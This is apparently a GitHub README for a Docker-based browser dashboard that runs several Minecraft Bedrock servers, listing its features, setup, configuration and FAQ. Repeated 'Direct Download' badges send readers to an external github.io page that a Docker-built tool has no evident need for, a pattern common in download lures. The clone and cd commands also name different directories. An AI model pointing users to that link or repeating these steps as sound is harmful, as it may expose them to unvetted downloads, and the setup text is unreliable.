# Minecraft Bedrock Server Manager v1.0 - Server Manager 2026

> A Docker-based browser dashboard for operating Minecraft Bedrock servers, giving you live control, status visibility, and configuration access for multiple instances from one responsive web UI.

[![Platform](https://img.shields.io/badge/Platform-Docker-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/evan-taylor38/bedrock-server-manager-dashboard?style=flat-square)](https://github.com/evan-taylor38/bedrock-server-manager-dashboard)

---

<p align="center">
  <a href="https://evan-taylor38.github.io/bedrock-server-manager-dashboard/">
    <img src="https://img.shields.io/badge/Download-Minecraft%20Bedrock%20Server%20Manager%20Latest-brightgreen?style=for-the-badge" alt="Download Minecraft Bedrock Server Manager">
  </a>
</p>

> **[Direct Download - Minecraft Bedrock Server Manager v1.0](https://evan-taylor38.github.io/bedrock-server-manager-dashboard/)**

---

[Download Latest Build](https://evan-taylor38.github.io/bedrock-server-manager-dashboard/)

---

## What Minecraft Bedrock Server Manager Does

Minecraft Bedrock Server Manager offers a single web console for Docker-hosted Minecraft Bedrock servers. It is built around the itzg/docker-minecraft-bedrock-server image and replaces routine terminal work with a cleaner graphical workflow. From one dashboard, you can run several servers at once, review their status, and make configuration changes without switching to shell access.

It is aimed at both small personal setups and operators who need to oversee several worlds at the same time. Access is protected with a password-based login and session handling so only approved users can reach the controls. Because the interface is responsive, it works well on phones, tablets, and desktop browsers alike, which makes remote administration easier when you are away from the machine.

---

## Capabilities

- Live server status updates through WebSocket connections
- Control several separate Bedrock server instances from one panel
- Bring existing Docker containers under management
- Select Latest, Preview, or a custom server version
- Launch, shut down, or reboot containers with one action
- Send console commands from the browser interface
- Set and tune memory limits for each server instance
- File manager for navigating and editing server files
- Addon handling for installing and removing behavior packs and resource packs
- Backup and restore world saves
- Edit configuration files directly in the browser
- Player tools for kick, ban, operator assignment, and deop
- Automatic port assignment to reduce server port conflicts
- Password-protected access with session-based authentication
- Responsive layout for use on phones, tablets, and desktops

---

## Getting Started

Clone the repository onto the Docker host:

```bash
git clone https://github.com/evan-taylor38/bedrock-server-manager-dashboard.git
cd minecraft-bedrock-server-manager
```

Build and launch the container with Docker Compose:

```bash
docker-compose up -d
```

Open the web interface at `http://localhost:8080` or the IP address of your server. The initial login details are created on first run; check the configuration section to adjust them.

---

## Using the Dashboard

Once you sign in, the main dashboard shows every server you manage. To create a new one, use the "Add Server" button and enter a name, a version option (Latest, Preview, or custom), and the memory amount to reserve. The manager then fetches the correct Docker image and starts the container automatically.

The server detail screen is where you track live activity, read console output, and issue commands. In the file manager tab, you can browse the server folder, update files such as `server.properties`, and work with worlds. Player controls are grouped in their own area so you can kick, ban, or give operator permissions as needed.

For backups, go to the worlds area and choose the backup action. Restoring follows the same pattern: select an existing backup and apply it to the destination server.

---

## Configuration

Configuration values live in `config/config.json` inside the container. If you want settings to persist, mount that file as a volume. Important options include:

- `username` and `password` for web UI authentication
- `port` for the web interface (default 8080)
- `dataDir` for storing server data and backups

Example volume mount in docker-compose.yml:

```yaml
volumes:
  - ./config:/app/config
  - ./data:/app/data
```

---

## Requirements

- Docker Engine 20.10 or later
- Docker Compose v2 or later
- At least 2 GB of RAM (more recommended for multiple servers)
- 10 GB of free disk space per server instance
- Modern web browser with WebSocket support (Chrome, Firefox, Edge, Safari)
- Network access for pulling Docker images from registries

---

## Frequently Asked Questions

**How do I update the manager itself?**
Pull the newest repository changes and rebuild the Docker image with `docker-compose up -d --build`.

**Can I manage servers running on different machines?**
No. At present, the manager only controls containers on the same Docker host where it is installed.

**What happens if my session expires?**
Inactive sessions time out automatically, and you will be asked to log in again. Your server state is not affected.

**How do I reset the admin password?**
Stop the container, open `config.json`, change the password field, then start the container again.

**Will existing server data be preserved during updates?**
Yes, provided the data volume is mounted correctly and not removed. Back up important worlds before updating.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
